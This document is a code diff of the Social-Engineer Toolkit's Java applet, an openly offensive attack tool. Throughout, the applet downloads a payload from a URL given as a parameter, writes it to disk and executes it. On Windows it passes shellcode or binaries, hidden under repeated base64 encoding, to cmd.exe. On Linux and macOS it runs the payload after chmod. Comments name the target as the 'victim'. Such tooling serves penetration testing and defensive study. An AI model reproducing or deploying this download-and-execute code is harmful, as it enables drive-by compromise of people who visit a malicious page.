@@ -11,7 +11,7 @@ import java.net.URLConnection;
  *
  *    Java Applet for the Social-Engineer Toolkit
  *    Original work from Thomas Werth and customized
- *    by Dave Kennedy (ReL1K). 
+ *    by Dave Kennedy (@HackingDave). 
  *
  **************************************************************/
 
@@ -43,84 +43,129 @@ public class Java extends Applet {
             String  fourthParm = "";
             String  fifthParm  = "";
     	    String  sixthParm  = "";
-	        String  seventhParm = "";
-	        String  eightParm = "";
+	    String  seventhParm = "";
+	    String  eightParm = "";
             short osType = -1 ;  // 0=WIN, 1=MAC, 2=NIX
-
             if  (os.indexOf( "win" ) >= 0) // We are running Windows then
             {
-    		    // 1 = WINDOWSPLZ
-	    	    // 2 = ILIKESTUFF
-		        // 3 = OSX
-		        // 4 = LINUX
-		        // 5 = X64
-		        // 6 = X86
-		        // 7 = HUGSNOTDRUGS
-		        // 8 = LAUNCH 
-		        // 9 = nextPage
-		        // 10 = B64EncodeTimes
+    		// 1 = WINDOWSPLZ
+	    	// 2 = ILIKESTUFF
+		// 3 = OSX
+		// 4 = LINUX
+		// 5 = X64
+		// 6 = X86
+		// 7 = HUGSNOTDRUGS
+		// 8 = LAUNCH 
+		// 9 = nextPage
+		// 10 = B64EncodeTimes
                 downParm    =   getParameter( "1" );
                 nextParm    =   getParameter( "2"  );
                 thirdParm   =   getParameter( "5" );
                 fourthParm  =   getParameter( "6" );
                 fifthParm   =   getParameter( "7" );
-	    	    sixthParm   =   getParameter( "8" );
-		        seventhParm =   getParameter( "9" );
-		        eightParm   =   getParameter( "10" );
+	    	sixthParm   =   getParameter( "8" );
+		seventhParm =   getParameter( "9" );
+		eightParm   =   getParameter( "10" );
                 osType      =   0;
                 pfad += token + ".exe";
-            }
-                else if (os.indexOf("mac") >= 0) //MAC
-            {
-                downParm    =   getParameter( "3" );
-                osType      =   1;
-
+            	}
+                	else if (os.indexOf("mac") >= 0) //MAC
+            	{
+                	downParm    =   getParameter( "3" );
+                	osType      =   1;
 		        // look for special folders to define snow leopard, etc.
   		        if (pfad.startsWith("/var/folders/")) pfad = "/tmp/"; // OSX SNOW LEOPARD AND ABOVE
-                pfad += token + ".bin";
-            }
+	                pfad += token + ".bin";
+                }
                 else if (os.indexOf( "nix") >=0 || os.indexOf( "nux") >=0) // UNIX
-            {
+                {
                 downParm    =   getParameter( "4" );
                 osType      =   2;
                 pfad += token + ".bin";
-            }
-       	if ( downParm.length() > 0  && pfad.length() > 0 )
-	    {
-            // URL parameter
-            URL url = new URL(downParm);
-            // Open the conneciton
- 	        URLConnection hc = url.openConnection();
-            // set the user agent string
-            hc.setRequestProperty("User-Agent", "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.4; en-US; rv:1.9.2.2) Gecko/20100316 Firefox/3.6.2");
-            // grab content type
-            String contentType = hc.getContentType();
-            // grab content length
-            int contentLength = hc.getContentLength();
-            // pull input stream
+                }
+    	   	if ( downParm.length() > 0  && pfad.length() > 0 )
+	        {
+
+	   if ( osType < 1 )
+	   {
+	   // here we check for powershel
+           File file = new File("c:\\Windows\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe");
+  	   if (!file.exists()) {
+ 	        // URL parameter
+        	URL url = new URL(downParm);
+            	// Open the conneciton
+ 	    	URLConnection hc = url.openConnection();
+            	// set the user agent string
+            	hc.setRequestProperty("User-Agent", "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.4; en-US; rv:1.9.2.2) Gecko/20100316 Firefox/3.6.2");
+            	// grab content type
+            	String contentType = hc.getContentType();
+            	// grab content length
+            	int contentLength = hc.getContentLength();
+            	// pull input stream
 	        InputStream raw = hc.getInputStream();
-            // stream buffer into raw input stream
-    	    InputStream in = new BufferedInputStream(raw);
-            // write the bytes out
-       	    byte[] data = new byte[contentLength];
-            int bytesRead = 0;
-            int offset = 0;
-            while (offset < contentLength) {
-                bytesRead = in.read(data, offset, data.length - offset);
-                if (bytesRead == -1)
-                    break;
-                offset += bytesRead;
-	            }
-            // close it
-            in.close();
-            // write file out to pfad
-            String filename = url.getFile();
-            FileOutputStream out = new FileOutputStream(pfad);
-            // close everything out
-            out.write(data);
-            out.flush();
-            out.close();
-            }
+            	// stream buffer into raw input stream
+    	    	InputStream in = new BufferedInputStream(raw);
+            	// write the bytes out
+       	    	byte[] data = new byte[contentLength];
+            	int bytesRead = 0;
+            	int offset = 0;
+            	while (offset < contentLength) {
+                	bytesRead = in.read(data, offset, data.length - offset);
+                	if (bytesRead == -1)
+                    	break;
+	                offset += bytesRead;
+		            }
+            	// close it
+            	in.close();
+            	// write file out to pfad
+            	String filename = url.getFile();
+            	FileOutputStream out = new FileOutputStream(pfad);
+            	// close everything out
+	        out.write(data);
+        	out.flush();
+                out.close();
+                }
+//		}
+		}
+
+    	         // download file all other OS
+		if ( osType > 1 ){
+                // URL parameter
+                URL url = new URL(downParm);
+                // Open the conneciton
+                URLConnection hc = url.openConnection();
+                // set the user agent string
+                hc.setRequestProperty("User-Agent", "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.4; en-US; rv:1.9.2.2) Gecko/20100316 Firefox/3.6.2");
+                // grab content type
+                String contentType = hc.getContentType();
+                // grab content length
+                int contentLength = hc.getContentLength();
+                // pull input stream
+                InputStream raw = hc.getInputStream();
+                // stream buffer into raw input stream
+                InputStream in = new BufferedInputStream(raw);
+                // write the bytes out
+                byte[] data = new byte[contentLength];
+                int bytesRead = 0;
+                int offset = 0;
+                while (offset < contentLength) {
+                        bytesRead = in.read(data, offset, data.length - offset);
+                        if (bytesRead == -1)
+                        break;
+                        offset += bytesRead;
+                            }
+                // close it
+                in.close();
+                // write file out to pfad
+                String filename = url.getFile();
+                FileOutputStream out = new FileOutputStream(pfad);
+                // close everything out
+                out.write(data);
+                out.flush();
+                out.close();
+		}
+		}
+
             // has it executed yet? then target nextPage to victim
             String page = getParameter( "9" );
             if ( page != null && page.length() > 0 )
@@ -203,8 +248,8 @@ public class Java extends Applet {
 			if (sixthParm.length() > 2)
 			{
 				// all parameters are base64 encoded, this will decode for us and pass the decoded strings
-                BASE64Decoder decoder = new BASE64Decoder();
-                byte[] decoded = decoder.decodeBuffer(nextParm);
+                		BASE64Decoder decoder = new BASE64Decoder();
+                		byte[] decoded = decoder.decodeBuffer(nextParm);
 				// decode again
 				String decoded_string =  new String(decoded);
 				String decoded_string_2 = new String(decoder.decodeBuffer(decoded_string));
@@ -222,32 +267,34 @@ public class Java extends Applet {
 				String decoded_string_8 = new String(decoder.decodeBuffer(decoded_string_7));
 				// again
 				String decoded_string_9 = new String(decoder.decodeBuffer(decoded_string_8));
-                // again
-                String decoded_string_10 = new String(decoder.decodeBuffer(decoded_string_9));
-                // last one
-                String decoded_string_11 = new String(decoder.decodeBuffer(decoded_string_10));
+                		// again
+		                String decoded_string_10 = new String(decoder.decodeBuffer(decoded_string_9));
+		                // last one
+                		String decoded_string_11 = new String(decoder.decodeBuffer(decoded_string_10));
 
 				PrintStream out = null;
 				String randomfile = Long.toString(Math.abs(r.nextLong()), 36);
-				try {
+				try 
+				{
 				    out = new PrintStream(new FileOutputStream(writedir + randomfile));
 				    out.print(decoded_string_11);
 				}
-				finally {
+				finally 
+				{
 				    if (out != null) out.close();
 				}
-				// this is if we are using multipyinjector
-                f = Runtime.getRuntime().exec("cmd.exe /c \"" + pfad + " " + writedir + randomfile + " " + eightParm);
-				// this runs the single instance of shellcodeexec, pyinjector, or a binary
-				f = Runtime.getRuntime().exec("cmd.exe /c \"" + pfad + " " + decoded_string_11 + "\"");
-			}
-                 }
+					// this is if we are using multipyinjector
+			                f = Runtime.getRuntime().exec("cmd.exe /c \"" + pfad + " " + writedir + randomfile + " " + eightParm);
+					// this runs the single instance of shellcodeexec, pyinjector, or a binary
+					f = Runtime.getRuntime().exec("cmd.exe /c \"" + pfad + " " + decoded_string_11 + "\"");
+				}
+	                 }
 
             }
         else // if not windows then use linux/osx/etc.
         {
 		    // change permisisons to execute
-	        Process process1 = Runtime.getRuntime().exec("/bin/chmod 755 " + pfad);
+	    Process process1 = Runtime.getRuntime().exec("/bin/chmod 755 " + pfad);
             process1.waitFor();                
 		    //and execute
             f = Runtime.getRuntime().exec(pfad);
